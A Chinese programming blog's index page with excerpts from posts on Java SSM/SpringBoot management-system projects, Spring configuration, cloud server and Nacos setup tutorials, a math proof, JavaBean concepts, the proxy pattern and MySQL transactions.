	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e24cc2ffa7f2698ed487193051b7202d/" rel="bookmark">
			（附源码）SSM银行账目管理平台 毕业设计43684
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘 要
当今社会已进入信息社会时代，信息已经受到社会的广泛关注，被看作社会和科学技术发展的三大支柱(材料,能源,信息)。信息是管理的基础，是进行决策的的基本依据。在一个组织里信息已作为人力,物力,财力之外的第四种能源,占有重要的地位。然而;信息是一种非物质的,有别于基本资源的新形式的资源.信息也是管理的对象,必须进行管理和控制.本系统主要完成对银行账目管理的帐户管理,取款管理,存款管理，挂失管理，办卡申请管理，用户查询,查询统计等。系统有完整的后台添加,管理,密码修改功能.系统采用JSP为编程语言.论文主要介绍了本课题的开发背景,所要完成的功能和开发的过程.重点的说明了系统设计的重点,设计思想,难点技术和解决方案.
关键词：银行账目管理平台；JSP技术；SSM框架；MYSQL数据库；
SSM Bank Account Management Platform
Abstract
Today's society has entered the era of information society, and information has received widespread attention from society, regarded as the three pillars of social and scientific and technological development (materials, energy, and information). Information is the foundation of management and the fundamental basis for decision-making. In an organization, information has played an important role as the fourth energy source beyond human, material, and financial resources.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e24cc2ffa7f2698ed487193051b7202d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf804078eed40fa999a18e84e868e23f/" rel="bookmark">
			【开源】基于JAVA语言的贫困地区人口信息管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、摘要1.1 项目介绍1.2 项目录屏 二、功能模块2.1 人口信息管理模块2.2 精准扶贫管理模块2.3 特殊群体管理模块2.4 案件信息管理模块2.5 物资补助模块 三、系统设计3.1 用例设计3.2 数据库设计3.2.1 人口表3.2.2 扶贫表3.2.3 特殊群体表3.2.4 案件表3.2.5 物资补助表 四、系统展示五、核心代码5.1 查询企事业单位5.2 查询流动人口5.3 增改精准扶贫数据5.4 查询贫困家庭支出5.5 查询人口 六、免责说明 一、摘要 1.1 项目介绍 基于JAVA+Vue+SpringBoot+MySQL的贫困地区人口信息管理系统，包含了贫困人口管理、精准扶贫管理、贫困家庭支出统计、特殊群体、贫困户子女信息、案件信息、物资补助申领模块，还包含系统自带的用户管理、部门管理、角色管理、菜单管理、日志管理、数据字典管理、文件管理、图表展示等基础模块，贫困地区人口信息管理系统基于角色的访问控制，给管理员、工作人员使用，可将权限精确到按钮级别，您可以自定义角色并分配权限，系统适合设计精确的权限约束需求。
贫困地区人口信息管理系统是一种通过信息化手段来解决贫困人口问题的管理模式。本研究以中国的贫困地区为研究对象，旨在探索建立基于信息技术的贫困地区人口信息管理系统的可行性及其对贫困人口脱贫的作用，本研究具有一定的理论与实践意义，可推动贫困人口管理工作的现代化和科学化，促进社会公平和经济发展。
贫困地区人口信息管理系统基于Java语言开发，包含了登录注册模块、人口信息管理、精准扶贫管理、特殊群体管理、案件信息管理、物资补助管理模块，用于贫困管理机构维护信息，采用前后端分离的技术架构，前端采用Vue.js，后端采用Spring Boot框架，采用MySQL数据库。有了这样一套功能完整的贫困地区人口信息管理系统，社区人员管理贫困人口数据会更加方便快捷。
1.2 项目录屏 二、功能模块 贫困地区人口信息管理系统的功能性需求主要包含人口信息管理、精准扶贫管理、特殊群体管理、案件信息管理、物资补助管理这五大模块，系统是基于浏览器运行的web管理后端，其中各个模块详细说明如下。
2.1 人口信息管理模块 贫困人口管理系统需要人口信息管理模块，它的目的是收集、记录和管理贫困人群的基础信息，并对他们进行分类、筛选和分析，从而使政府和社会各界能够更好地制定出适合他们的扶贫政策和措施。贫困人口管理系统能够实现信息化管理，利用人口信息管理模块，能够将贫困人口的基本信息进行数字化、集成化，从而达到信息化管理的目的，从而提升数据的质量和工作效率。贫困人口管理系统能够提升扶贫的精准性，利用人口信息管理模块，能够对贫困人口展开有效的分类和筛选，从而让政府和社会各界对贫困人口的特点和需要有更好的了解，从而制定出更精准的扶贫政策和措施。可以说，人口资讯管理模式是贫穷人口管理系统中不可缺少的一环，它可以提升贫穷人口管理的准确性、有效性与科学性
2.2 精准扶贫管理模块 贫困人口管理系统需要精准扶贫模块，这主要是由于传统的扶贫方式存在着许多缺陷，比如对扶贫对象的信息不全面、不准确，很难达到扶真贫、脱真贫的效果。但是，借助精准扶贫模块，可以更加全面、深入地识别并分析贫困人口，从而实现对贫困人口的有效分类、定位和帮扶，从而提升扶贫工作的针对性和效率。精准扶贫模块能够准确地识别贫困户，通过收集贫困户的基本信息、收入情况、生活状况等数据，对贫困户展开统计分析和评估，从而确定扶贫对象和扶贫范围，确保资金和资源的有效利用和分配。
2.3 特殊群体管理模块 贫困人口管理系统需要特殊群体模块，主要是因为贫困人口具有一定的特殊性和复杂性，需要更加精准、全面和细致的管理和服务。一是特殊的信息需求，贫困人口通常具有不同于一般人群的信息需求，例如家庭收入、健康状况、教育水平等方面的信息，需要建立相应的指标和评估体系，并通过特殊群体模块进行数据采集和管理。二是独特的生活环境，贫困人口通常处于较为艰苦的生活环境中，需要针对其生存和发展状况进行量化分析和评价。三是特殊的政策支持，针对贫困人口的扶贫政策和措施，在很大程度上是基于其特殊的生存和发展需求而制定的，需要在贫困人口管理系统中建立相应的特殊群体模块，以便更加有效地实施这些政策和措施。
2.4 案件信息管理模块 贫困人口管理系统需要案件信息模块，主要是为了记录和管理与贫困人口相关的案件信息，贫困人口在生活和工作中可能会遇到各种问题和困难，例如劳动权益保护、社会救助申请、医疗纠纷等，这些问题如果得不到及时解决，就会影响他们的生活和脱贫进程。通过案件信息模块，贫困人口管理系统可以实现对贫困人口遇到的各类问题进行登记、分类、查询和处理，确保贫困人口得到及时有效的帮助和支持。除此之外，案件信息模块还可以为相关部门和领导提供决策依据和参考，帮助其更好地了解和掌握贫困人口遇到的问题和困难，及时制定和调整扶贫政策和措施，加强贫困人口管理和服务，促进贫困地区的发展和稳定。
2.5 物资补助模块 贫困地区人口信息管理系统需要物资补助模块，这是由于贫困地区的人民生活水平低下，许多人要靠政府和其它机构的物质救济才能勉强糊口。为了保证资源的合理配置、高效使用，防止资源的浪费与滥用，必须对资源进行管理与跟踪。所以，将物资救助模块加入到人口信息管理中，便于对物资状况进行跟踪与管理，有助于政府或其它机构更好地帮助贫困地区的人们。
三、系统设计 3.1 用例设计 3.2 数据库设计 3.2.1 人口表 3.2.2 扶贫表 3.2.3 特殊群体表 3.2.4 案件表 3.2.5 物资补助表 四、系统展示 五、核心代码 5.1 查询企事业单位 @RequestMapping(value = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf804078eed40fa999a18e84e868e23f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfb3a075967fd587df9b6aca29dde796/" rel="bookmark">
			【开源】基于JAVA语言的CRM客户管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、摘要1.1 项目介绍1.2 项目录屏 二、功能模块三、系统设计3.1 用例设计3.2 E-R 图设计3.3 数据库设计3.3.1 客户表3.3.2 商品表3.3.3 客户跟踪表3.3.4 客户消费表3.3.5 系统角色表 四、系统展示五、核心代码5.1 查询客户5.2 新增客户跟踪记录5.3 新增客户消费订单5.4 查询商品5.5 商品购买 六、免责说明 一、摘要 1.1 项目介绍 基于JAVA+Vue+SpringBoot+MySQL的CRM客户管理系统，包含了客户管理、客户分析、商品管理、客户跟踪、客户消费模块，还包含系统自带的用户管理、部门管理、角色管理、菜单管理、日志管理、数据字典管理、文件管理、图表展示等基础模块，CRM客户管理系统基于角色的访问控制，给客户管理员、工作人员使用，可将权限精确到按钮级别，您可以自定义角色并分配权限，系统适合设计精确的权限约束需求。
1.2 项目录屏 二、功能模块 CRM客户管理系统的系统设计是一个基于系统分析结果的过程，使用科学的系统理念和方法来设计一个新系统，该系统可以最大限度地实现所需的目的。系统设计主要是功能设计，创建理想系统并制定设计计划；将系统划分为若干子系统；子系统和整个系统的详细设计和评估；演示系统方案并预测性能效果，本系统主要从五个功能模块分析。
首先是客户管理模块，主要实现用户的增删改查，对客户信息进行快速、准确的记录和查询操作，标记客户信息并对它进行分类，每个客户都具有唯一的编号，姓名，联系方式等基本信息，同时还有客户类型，客户状态等附加信息，能够导出客户信息。
第二是客户跟踪模块，该模块主要就是对潜在客户进行跟踪，记录跟踪内容和对跟踪信息增删改查，每个客户的跟踪记录包括跟踪日期、跟踪人、跟进内容等信息。
第三是客户消费模块，记录客户的消费情况，对客户的消费记录进行增删改查，同时也能导出客户消费记录信息到本地。
第四是商品管理模块，包括商品信息的增删改查、商品分类、商品库存管理等功能。
第五是系统基础模块，该模块包含若干子功能，但是该功能模块只有管理员角色可以操作。
三、系统设计 3.1 用例设计 3.2 E-R 图设计 3.3 数据库设计 3.3.1 客户表 3.3.2 商品表 3.3.3 客户跟踪表 3.3.4 客户消费表 3.3.5 系统角色表 四、系统展示 五、核心代码 5.1 查询客户 @RequestMapping(value = "/getByPage", method = RequestMethod.GET) @ApiOperation(value = "查询客户") public Result&lt;IPage&lt;Customer&gt;&gt; getByPage(@ModelAttribute Customer customer ,@ModelAttribute PageVo page){ QueryWrapper&lt;Customer&gt; qw = new QueryWrapper&lt;&gt;(); if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfb3a075967fd587df9b6aca29dde796/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5699c518487bbab547e6fd8c5d6a3eb/" rel="bookmark">
			Spring、Spring-MVC、Mybatis、Mybatis-generator整合核心配置文件记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring、Spring-MVC、Mybatis、Mybatis-generator整合核心配置文件记录 文章目录 Spring、Spring-MVC、Mybatis、Mybatis-generator整合核心配置文件记录1. spring.xml2. spring-mvc.xml3. mybatis-config.xml4. mybaits-generator.xml5. ehcach.xml6. web.xml Spring、Spring-MVC、Mybatis、Mybatis-generator整合核心配置xml文件记录
1. spring.xml &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd"&gt; &lt;!--引入系统配置的资源文件,多个文件使用 , 隔开--&gt; &lt;context:property-placeholder location="classpath:dbConfig.properties"/&gt; &lt;!--Spring自动扫描的dao与service包,自动注入这两个包下的所有--&gt; &lt;context:component-scan base-package="com.ssm.dao,com.ssm.service"/&gt; &lt;/beans&gt; 2. spring-mvc.xml &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:p="http://www.springframework.org/schema/p" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;!-- 自动扫描controllers下的所有类，使其成为Spring MVC的控制器 --&gt; &lt;context:component-scan base-package="com.ssm.controller"/&gt; &lt;!--下面两句不加上,有时候会出现handler无法访问的问题--&gt; &lt;!--将SpringMVC不能处理的请求交给Tomcat 这样可以访问静态资源--&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!--能支持springMVC更高级的一些功能，JSR303校验，快捷Ajax,映射动态请求--&gt; &lt;mvc:annotation-driven/&gt; &lt;!-- 避免IE执行Ajax时,返回的数据类型为JSON数据时出现下载文件的下载框 --&gt; &lt;bean id="mappingJackson2HttpMessageConverter" class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"&gt; &lt;property name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5699c518487bbab547e6fd8c5d6a3eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/436eb71905ded3bc7e0bb0b9c42b61cc/" rel="bookmark">
			SpringBoot注册Servlet、Filter、Listener、Interceptor四大组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot中注册四大组件 文章目录 SpringBoot中注册四大组件1. Servlet注册1. 基于配置类方式使用Servlet使用Servlet方式2. 基于纯注解方式配置Servlet 2. Filter(过滤器)注册1. 以配置类方式注册Filter2. 以纯注解方式注册Filter3. 以注解的方式注册Filter执行顺序不生效问题 3. Listener(监听器)注册1. `@Component`注解2. `@EventListener`注册监听3. 主启动配置监听 4. Interceptor(拦截器)注册5. 执行顺序 SpringBoot版本：2.2.5 GA 版
GA=General Availability，字面意思是 一般或正常可用性。
代表的是官方正式发布的版本，推荐可广泛使用的版本，国外有的软件用GA来表示RELEASE版本。 RELEASE表示正式发布版
&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.5.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; 1. Servlet注册 有两种使用方式
1.基于配置类方式使用Servlet
2.基于纯注解方式使用Servlet
1. 基于配置类方式使用Servlet使用Servlet方式 自定义一个MyServlet类，让其继承HttpServlet类
在配置类中使用ServletRegistrationBean类注册自定义MyServlet类
设置相关属性并访问
MyServlet package com.yuan.demo.servlet; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class MyServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { doPost(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String requestURI = req.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/436eb71905ded3bc7e0bb0b9c42b61cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/622a1a54eacd6bab6a8f7d3e02577f71/" rel="bookmark">
			手把手教你购买阿里云服务器以及Ubuntu环境下宝塔搭建网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阿里云服务器Ubuntu通过宝塔搭建网站详细教程 前言一、阿里云服务器的购买二、进入控制面板2.1 修改密码2.2 开放端口号 三、 测试服务器是否可以连接四、 安装nginx搭建网站(选做)五、安装宝塔5.1 登录宝塔官网5.2 卸载预装的mysql和nginx5.3 安装宝塔5.4 访问宝塔控制台5.5 修改宝塔的登录入口和账号密码5.6 添加网站六、使用宝塔WordPress搭建个人博客 前言 今天尝试购买了阿里云服务器，因为公司采用的是Ubuntu系统，所以也尝试用Ubuntu系统来作为服务器的系统，搭建网站的过程也碰到了很多问题，这个博客就记录一下自己搭建网站的过程。
一、阿里云服务器的购买 首先登录阿里云的官网
阿里云官网
我是购买的这款2核2G，40G硬盘存储空间99元一年的产品
我下面这张图是购买后的价格，也就是说99元算是很优惠了。
点击购买后。
地域：选择云服务器所在的物理位置，一般来说选择自己所在的区域，访问更快。操作系统：这里按照我自己想学习的是Ubuntu系统
一般不选择最新的系统，会选之前一个版本更稳定一些
剩下地方都是默认，不需要填写，第一次购买是99元
二、进入控制面板 支付完成之后，进入控制台，点击三个点
2.1 修改密码 搜索密码，点击重置实例密码
可以修改登录的用户名和密码
2.2 开放端口号 单击实例名称
安全组 - 管理规则
入方向-手动添加
增加4个端口，分别是
21用于FTP传输
80用于nginx
8888用于宝塔
34462用于宝塔
添加完记得点击保持
三、 测试服务器是否可以连接 这个时候，我们就可以尝试访问我们的服务器了，推荐使用XSell，我们先点击实例-IP地址的地方查看公网ip
然后打开Xshell，新建会话
名称：随便起一个名字协议：SSH主机： 公网ip地址用户名和密码是刚才重置之后的 看到这个界面说明成功连接了
四、 安装nginx搭建网站(选做) 首先这一步操作是可以选做的，不想操作的话可以直接看第五步，如果做了第四步还要涉及到nginx的卸载，因为宝塔的安装需要一个干净的环境，不支持nginx和mysql已经安装过的服务器。
输入指令
apt update 如下图
执行完后安装nginx
apt-get install nginx 中途需要输入Y
安装完之后，可以看下系统默认将nginx安装在哪儿了
find / -name "nginx" 可以看到，配置文件一般在/etc/nginx目录下
Ubuntu环境下，需要修改/etc/nginx/nginx.conf这个文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/622a1a54eacd6bab6a8f7d3e02577f71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/983eefe87472395493686be86b8a2ea2/" rel="bookmark">
			不等式证明（三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设 p , q p ,q p,q 是大于1的常数，并且 1 p + 1 q = 1 \frac{1}{p}+\frac{1}{q}=1 p1​+q1​=1.证明：对于任意的 x &gt; 0 x&gt;0 x&gt;0，有 1 p x p + 1 q ≥ x \frac{1}{p}x^p+\frac{1}{q}\geq x p1​xp+q1​≥x. 证明： 设
f ( x ) = 1 p x p + 1 q − x (1) f(x)=\frac{1}{p}x^p+\frac{1}{q}- x\tag{1} f(x)=p1​xp+q1​−x(1)
只需证得 f ( x ) ≥ 0 f(x)\geq0 f(x)≥0即可，求导
f ′ ( x ) = x p − 1 − 1 (2) f'(x)=x^{p-1}-1\tag{2} f′(x)=xp−1−1(2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/983eefe87472395493686be86b8a2ea2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f265d2c581a48433ed82ebdf3b9f6845/" rel="bookmark">
			Windows下安装Nacos完整过程（傻瓜式教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、下载Nacos源码 https://github.com/alibaba/nacos
2、创建数据库nacos,并导入路径nacos-develop\nacos-develop\distribution\conf下mysql-schema.sql，如下图 3、修改配置信息 找到nacos-develop\nacos-develop\distribution\conf下application.properties配置文件，打开，修改如下几个地方
#默认端口号，使用默认值即可 server.port=8848 # mysql数据源 spring.datasource.platform=mysql ### Count of DB: db.num=1 ### Connect URL of DB: db.url.0=jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC db.user.0=root db.password.0=你的数据库密码 #是否开启鉴权，作为学习这里就不开启了 nacos.core.auth.enabled=false #这里一定要设置一个base64加密的token，否则启动时会报如下错误 nacos.core.auth.plugin.nacos.token.secret.key=MTIzNDU2Nzg5MTIzNDU2Nzg5MTIzNDU2Nzg5MTIzNDU2Nzg5 注意，文档中的secret.key默认值SecretKey012345678901234567890123456789012345678901234567890123456789和VGhpc0lzTXlDdXN0b21TZWNyZXRLZXkwMTIzNDU2Nzg=为公开默认值，可用于临时测试，实际使用时请务必更换为自定义的其他有效值(base64加密的token)。
4、在Nacos下运行如下maven命令，生成nacos-server.jar mvn -Prelease-nacos -Dmaven.test.skip=true clean install -U
4.1 如下 4.2 复制 nacos-develop/console/target/nacos-server.jar 到 nacos-develop/distribution/target/ 目录 5、启动Nacos,有两种方式都可以 5.1 运行命令 startup.cmd -m standalone 5.2 双击 nacos-develop\nacos-develop\distribution\bin目录下 startup.cmd 5.3 出现如下图所示，表示启动成功 6、最后我们浏览器访问http://127.0.0.1:8848/nacos，输入用户名密码nacos/nacos(默认)，打开如下界面 至此，恭喜你，nacos就已经安装完毕，亲，如果对你有帮助，点个赞呗~~ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98eebf54e169480e16bd9e2a1cc2cd59/" rel="bookmark">
			各类Java对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念的混淆:
新一代的开发者，学习某一概念的不同描述或是案例后，人脑会去抽象、提取其特征。这一过程可能造成语义扩散、概念扭曲。这是一个盲人摸象的过程。
写到这里时，我在想：“盲人摸象”与“抽象”的“象”是不是一个意思呢？我差点儿就混淆了我自己。虽然两个词语都有“提取部分特征”的意思，但时代背景、指代对象完全不同！
就像javabean和pojo的诞生背景、含义完全不同，但如今经常看到"javabean是一个pojo","pojo是一个javabean"的描述，简直就是鸡生蛋蛋生鸡，而不去考证鸟类的祖先。
在某一时间段，人们对某种编程困境感到烦恼，不少开发者脑中开始形成一种新的理开发理念
一些代表人物提出了他们的见解。同一时期可能对类似概念并发提出了不同表述，在后世可能会被归结、翻译成同一概念。 归结后混淆的例子："Service"作为“服务”被用在了“业务逻辑”上，而"Buiness Logic"才是“业务逻辑”最好的描述归结后统一的例子： "Component"被翻译成了“构件”“组件”，现在统称组件 如果有官方组织维护概念，定义就有机会清晰；如javabean，我们有幸还能在Oracle维护的sun公司初版的教程上看到官方对它的描述。但是如果sun公司的网页全部被清空了呢？web在保存历史上还不够可靠。
当然，概念的初始版本也可能不完美或者不顺应时代（如架构方式）的转变，导致概念的转变。
sun公司也不可能复活过来大喊：不是的！javabean不是pojo!一种说法，作品在发布的那一刻，(解释权)就不属于作者了 本文会探讨这些概念，遵循唯物史观，尽力找出其时代背景、相对概念、演化过程，并标明材料出处。
组件模型 javaBean、EJB是以“组件”概念为基础提出的
根据Ian Sommerville《软件工程》第十版的总结,
书中提到了两种先人关于组件的定义。如今“组件”没有权威的组织去定义它。它公认的基础概念是"一个程序单元"。
面向对象、面向组件、面向服务是不同的软件工程思想。
组件和服务的概念可以兼容的，即组件可以是嵌入式的组件（嵌入其他代码中），也可以以服务的形式被其他应用使用。
原文简述：
基于构件的软件工程作为一种软件系统开发方法，是在20世纪90年代末期出现的。它的产生源于设计者们在使用面向对象的开发过程中所受到的挫折：面向对象开发不能够像人们所期待的那样完成广泛的复用。
传统嵌入式组件(非服务)自然不能单独运行，它需要容器：
对于充当程序单元而不是外部服务的构件来说，构件模型规定了必须由支持构件执行的中间件所提供的服务。Weinreich和Sametinger利用操作系统来类比解释构件模型：操作系统为应用提供一组通用服务（系统调用），组件模型也为组件体统一系列通用服务。
因此可以认为组件处于提供基础服务的“容器”中，如EJB在javaEE容器中
而javaBean就是一种组件，由sun定义其概念。最初的javaBean指前端GUI中的组件，如一个小窗口、按钮；
其他语言中前端GUI组件代表：VB（Visual Basic，win平台ui“控件”）,现代的web组件库（如vue的饿了么UI）
同这类前端组件一起出现的是同ide高度结合的、可视化界面编辑器。如VB控件编辑、Java的JBuilder。
由此名称衍生出的、由sun公司官方定义的还有一种Enterprise JavaBean，是JavaEE规范中的分布式（多用于服务端）组件。
组件与容器：EJB与javaEE平台；COM与.NET平台；
javabean项目 这篇文章应该以解释、论证定义为主 com组件 组件 相关里理论 与领域模型理论的关系 JavaBeans™ architecture -看来组件是一种架构？ 也许我的网站应该把目前学的知识在图中的位置展现出来，以好让我明白那是一种架构 and 个人理论同全局理论的矛盾-也许追求统一是一种哲学？ 组件在GUI有“行为”，但行为是业务逻辑吗？组件为了复用，复用的逻辑哪里都用，还算业务吗 当初想问的这个行为应该是类似js吧 三层架构业务层统一了逻辑，分层架构似乎和领域、组件时不一样的方向处理业务，类似AOP和三层架构一个横一个纵。那么有分层架构的单体GUI应用吗 容器与bean也在控件有类似的概念吗？还是说组件模型里的？EE有容器，servlet不是bean，docker也不是 说起来js也有监听器之类的东西，GUI架构里也提到早期的表单也有数据监听，，，是不是前端或者组件模型都有这个。也许也是前端的共性呢 为什么都不用构造函数了？明明mybatis的sqlsessionFactory工厂也用了。感觉一直在set，重复的set
JavaBean java是咖啡，bean是豆子。
JavaBean规范是由Sun公司定义的。JavaBean是遵守JavaBean API1规范的Java类，它是一个可以重复使用的组件。
JavaBeans™使组件复用变得容易. 开发者们使用其他人开发的组件时不需要了解其内部实现。
这个面向对象是不是也说过。果然一个抽象一个具体
容易复用是因为遵循统一且合理的规范：无参构造
那么这个前端的javabean有没有逻辑就要看前端组件架构的理论要不要业务逻辑了？那现在的后端，之前后端的ejb有业务逻辑，但pojo和三层架构取代了这个“业务逻辑生态位”，所以后端bean。，去哪里了？作为后端组件？那有逻辑吗？如果有的话，是不是意味着前端bean其实也有业务逻辑，也即一开始没有限制？ 我猜测组件架构应该是有业务逻辑的，因为ejb也是bean也是组件（？）或许是通用业务逻辑？ 看看mvvm这种纯前端模式吧业务逻辑放哪里 官方教程说了：只要让你的类长得像bean，工具们自己会认得
JavaBean主要规范：
bean组件具有属性（property）；通过提供getter/setter方法来实现属性； 同类的成员变量相比，“属性”是组件中的概念，对内封装变量、对外暴露给调用方。这是面向对象开发的“封装”概念的具体应用 要可以持久化(@Since jdk1.4) 上述描述经常出现在各大教程中。官网教程还介绍了bean的其他部分的称呼（确实比起实现接口那种必须填写的规范，更像是对可有可无部分的称呼）：
- 方法：“bean的方法”是设计bean能做什么。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98eebf54e169480e16bd9e2a1cc2cd59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05210c7eef27cd4badbe813ba8aaa9ab/" rel="bookmark">
			Java 代理模式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 代理模式 代理模式是一种比较好理解的设计模式。简单来说就是 我们使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。
代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。
代理模式有静态代理和动态代理两种实现方式，我们 先来看一下静态代理模式的实现。
2. 静态代理 静态代理中，我们对目标对象的每个方法的增强都是手动完成的（后面会具体演示代码），非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦(需要对每个目标类都单独写一个代理类）。 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。
上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。
静态代理实现步骤:
定义一个接口及其实现类；创建一个代理类同样实现这个接口将目标对象注入进代理类，然后在代理类的对应方法调用目标类中的对应方法。这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。 下面通过代码展示！
1.定义发送短信的接口
public interface SmsService { String send(String message); } 2.实现发送短信的接口
public class SmsServiceImpl implements SmsService { public String send(String message) { System.out.println("send message:" + message); return message; } } 3.创建代理类并同样实现发送短信的接口
public class SmsProxy implements SmsService { private final SmsService smsService; public SmsProxy(SmsService smsService) { this.smsService = smsService; } @Override public String send(String message) { //调用方法之前，我们可以添加自己的操作 System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05210c7eef27cd4badbe813ba8aaa9ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4241287f7d40ed834539455bc3389204/" rel="bookmark">
			MySQL修炼手册11：事务处理：确保数据的一致性与完整性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在开头 在探索数据管理的世界中，理解如何在数据库中使用事务处理，无疑是一项关键的能力。在处理复杂的数据库操作，尤其是在你试图在多个表或数据库中更新数据时，事务可以确保这些更改具有原子性、一致性、隔离性和持久性，即ACID。因此，掌握事务对任何数据库专业人员来说都是必不可少的。
1. 事务的基本概念 定义事务（Transaction）是数据库管理系统进行处理的一个程序执行单位。一般来说，一个事务从BEGIN TRANSACTION语句开始，经过一组DML（如INSERT、UPDATE、DELETE）或DDL（如CREATE、ALTER、DROP等）的SQL操作，然后以COMMIT或ROLLBACK语句结束。这是最简单、最典型的事务开始和结束的方式。
1.1 了解事务的ACID属性 事务的重要性在于它们满足了许多企业级应用所需的四大特性，即ACID：
原子性(Atomicity)： 原子性确保操作要么全都进行，要么全都不进行。换句话说，如果一个事务涉及到多个步骤（比如向两个不同的表插入数据），那么要么所有步骤都成功，要么整个事务回滚，保持数据的一致性。
一致性(Consistency)： 事务开始之前和结束之后，数据库的完整性必须得到维护。也就是说，事务必须使数据库从一个一致状态转移到另一个一致状态。例如，如果一个事务涉及到转账操作，无论事务是否成功，转出和转入账户的总金额都应保持一致。
隔离性(Isolation)： 隔离性保证并发运行的事务的变更是隔离的，也就是发生在隔离级别下的并发事务，它们各自的修改对其他并发运行的事务是不可见的，除非事务提交。
持久性(Durability)： 一旦事务提交，对数据库的更改就将被永久保持，即使系统有了故障，通过日志和数据库恢复机制仍能找回数据。
1.2 事务的起始与结束 事务开始是通过BEGIN TRANSACTION语句表示的。它告诉数据库管理系统（DBMS），我们即将开始一组作为单个工作单位进行的操作。一旦BEGIN TRANSACTION命令执行后，那么接下来的数据库操作将会在事务的保护下运行。
事务的结束可以有两种方式：
